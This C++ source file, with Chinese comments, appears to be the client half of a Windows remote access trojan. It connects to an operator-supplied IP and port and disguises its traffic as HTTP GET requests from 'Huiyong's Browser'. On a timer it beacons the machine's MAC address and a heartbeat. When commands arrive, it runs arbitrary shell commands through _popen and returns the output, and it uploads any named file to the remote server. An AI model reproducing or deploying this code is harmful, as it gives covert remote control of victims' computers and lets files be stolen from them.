//#include "stdafx.h"
#include <stdio.h>                      
#include <winsock2.h>                   
#include <Windows.h>                    

#include <Windows.h>
#include "Iphlpapi.h"
#include <stdio.h> 
#include <winsock2.h>
#include <iostream>
using namespace std;
#pragma comment(lib,"Iphlpapi.lib")
#pragma comment(lib,"Ws2_32.lib")
#pragma comment (lib, "ws2_32")         //socket库文件
#pragma comment(lib, "ws2_32.lib")
char IP[50] = "";
int port;
#define FILESIZE        65535
#define MAX_CMD_LEN		2560
#define MAC_ADDR_LEN	20
char http_req_hdr_tmpl[] = "GET %s HTTP/1.1\r\n"
    "Accept: image/gif, image/jpeg, */*\r\nAccept-Language: zh-cn\r\n"
    "Accept-Encoding: gzip, deflate\r\nHost: %s:%d\r\n"
    "User-Agent: Huiyong's Browser <0.1>\r\nConnection: Keep-Alive\r\n\r\n"
	"Content: %s\r\n";

int Send(SOCKET s, char buf[],int len, int no_use)
{
	char buff[MAX_CMD_LEN] = "";
	sprintf(buff,http_req_hdr_tmpl,IP,IP,port,buf);
	return send(s, buff, strlen(buff)+1, 0);
}

int Recv(SOCKET s,char buf[],int len,int flag)
{
	char RecvBuff[MAX_CMD_LEN] = "";
	char File[MAX_CMD_LEN] = "";
	int iResult = recv(s,RecvBuff,MAX_CMD_LEN,NULL);
	strcpy(File,strstr(RecvBuff,"\r\n\r\n") + 4 );
	strncpy(buf,File,strlen(File));
	printf("Cmd : %s\n",buf);
	return iResult;
}
	
BOOL GetAdapterByIp(PCHAR AdapterName, ULONG IP, SOCKET s)
{
	char MAC[100] = "";
    ULONG ulAdapterInfoSize = sizeof(IP_ADAPTER_INFO);
    IP_ADAPTER_INFO *pAdapterInfo = (IP_ADAPTER_INFO*)new char[ulAdapterInfoSize];
    IP_ADAPTER_INFO *pAdapterInfoEnum = NULL;
 
    if( GetAdaptersInfo(pAdapterInfo, &ulAdapterInfoSize) == ERROR_BUFFER_OVERFLOW ){
        // 缓冲区不够大
        delete[] pAdapterInfo;
        pAdapterInfo = (IP_ADAPTER_INFO*)new char[ulAdapterInfoSize];
    }
    
    pAdapterInfoEnum = pAdapterInfo;
    if( GetAdaptersInfo(pAdapterInfoEnum, &ulAdapterInfoSize) == ERROR_SUCCESS ){
        do{    
            if( pAdapterInfoEnum->Type == MIB_IF_TYPE_ETHERNET ){
                    sprintf( MAC,"%02X-%02X-%02X-%02X-%02X-%02X\n", pAdapterInfoEnum->Address[0],pAdapterInfoEnum->Address[1],
                        pAdapterInfoEnum->Address[2],pAdapterInfoEnum->Address[3],pAdapterInfoEnum->Address[4],pAdapterInfoEnum->Address[5]);
					//printf("Your MAC: %s\n",MAC);
					int iResult = Send(s,MAC,strlen(MAC),NULL);
					if (iResult == SOCKET_ERROR) {
							printf("send failed with error: %d\n", WSAGetLastError());
							return 0;
						}
					break;
            }
            pAdapterInfoEnum = pAdapterInfoEnum->Next;
        }while(pAdapterInfoEnum);
    }
    delete []pAdapterInfo;
    return FALSE;
}
 
void Send_Mac(SOCKET s)
{
    char szName[MAX_PATH] = {0};
    int err = gethostname(szName, MAX_PATH);
 
    if( err==SOCKET_ERROR ) {
        printf("gethostname fail %08x\n", WSAGetLastError());
        return;
    }
    hostent *pHostent = gethostbyname(szName);
    ULONG ulAdapterIp = *(ULONG*)pHostent->h_addr_list[0];
	GetAdapterByIp(NULL,ulAdapterIp,s);
}



SOCKET Socket_Init(){
	SOCKET ClientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	sockaddr_in ServerAddr, LocalAddr;
	LocalAddr.sin_family = AF_INET;
	LocalAddr.sin_addr.s_addr = inet_addr("127.0.0.1");
	LocalAddr.sin_port = htons(9000);
	memset(LocalAddr.sin_zero, 0x00, 8);
	bind(ClientSocket, (struct sockaddr*)&LocalAddr, sizeof(LocalAddr));
	
	ServerAddr.sin_family = AF_INET;
	ServerAddr.sin_addr.s_addr = inet_addr(IP);
	ServerAddr.sin_port = htons(port);
	memset(ServerAddr.sin_zero, 0, 8);
	int iResult = connect(ClientSocket, (struct sockaddr*)&ServerAddr, sizeof(ServerAddr));
	if (iResult == SOCKET_ERROR) {
		printf("Connect error!\n");
		return 0;
	}
	return ClientSocket;
}

int execmd(char* cmd,SOCKET ClientSocket) {
    char buffer[128] = "";                         //定义缓冲区                        
	char result[MAX_CMD_LEN] = "";
    FILE* pipe = _popen(cmd, "r");            //打开管道，并执行命令 
    if (!pipe)
          return 0;                      //返回0表示运行失败 
        
    while(!feof(pipe)) {
    if(fgets(buffer, 128, pipe)){             //将管道输出到result中 
            strcat(result,buffer);
        }
    }	
	printf("%s\n",result);
	Send(ClientSocket,result,strlen(result) + 1 ,NULL);
    _pclose(pipe);                            //关闭管道
    return 1;                                 //返回1表示运行成功 
}

void SendFile(char FileName[],SOCKET s){
	char txt[] = "0";
	long flen = 0;
	char Flen[8] = "";
	char Length[100] = "";           //文件名发送
	FILE * fp;
	if (!(fp = fopen(FileName, "rb"))){
		Send(s, (char*)(LPCTSTR)"0",1, NULL);
		char Msg[] = "Open File failed!";
		Send(s,Msg,strlen(Msg),NULL);
		return;
	}
	fseek(fp,0L,SEEK_END);
	flen=ftell(fp);
	itoa(flen,Flen,10);
	fseek(fp,0L,SEEK_SET);
	Send(s,Flen,strlen(Flen), NULL);
	printf("FileName:%d %s\n",flen,FileName);
	int i = 0;
	while(i < flen){           //文件发送
		char txt[FILESIZE+1] = "";
		int j = 0;
		for (j;j<FILESIZE;i++,j++){
			if (i>=flen) break;
			txt[j] = fgetc(fp);
		}
		Send(s,txt,j*sizeof(char), NULL);
	}
}

DWORD WINAPI Heart(LPVOID lpParameter){
	char heartbeat[] = "hello" ;//心跳包
	SOCKET ClientSocket = (SOCKET)lpParameter;
	while(1){ 
		Send_Mac(ClientSocket);
		Sleep(1000);
		Send(ClientSocket, heartbeat, strlen(heartbeat), NULL);
		Sleep(1000000);
	}
	return 1;
}

int Operation(SOCKET ClientSocket){
	HANDLE User_Thread = CreateThread(NULL, 0, Heart, (LPVOID)ClientSocket, 0, NULL);
	CloseHandle(User_Thread);
	printf("Wait for cmd......");
	while (true)
	{
		char Cmd[MAX_CMD_LEN] = "";//CMD操作 
		char remote_file[20] = ""; //文件操作
		Recv(ClientSocket, Cmd, MAX_CMD_LEN, NULL);
		cout<<Cmd<<endl;
		int CmdNo = Cmd[0]-'0';
		switch (CmdNo)
		{
			case 0:{
				break;
			}
			case 1:{
				if (!execmd(Cmd+2,ClientSocket))
					Send(ClientSocket, (char*)(LPCTSTR)"CMD Failed!",12,NULL);
				break;
			}
			case 2:{
				strcpy(remote_file,strchr(Cmd,' ')+1);
				SendFile(remote_file,ClientSocket);
				break;
			}
		}
	}
	printf("Server is down!\n");
	return 1;
}

int main(int argc, char * argv[])
{
	if (argc!=3){
		printf("client.exe ip port");
		//exit();
	}
	memcpy(IP,argv[1],strlen(argv[1])); 
	port = atoi(argv[2]);
	WSADATA Ws;
	WSAStartup(MAKEWORD(2, 2), &Ws);
	SOCKET ClientSocket = Socket_Init();
	while(1){
		if (ClientSocket != 0)
			Operation(ClientSocket);
		else
			ClientSocket = Socket_Init();
	}
	closesocket(ClientSocket);
	WSACleanup();
	return 0;
}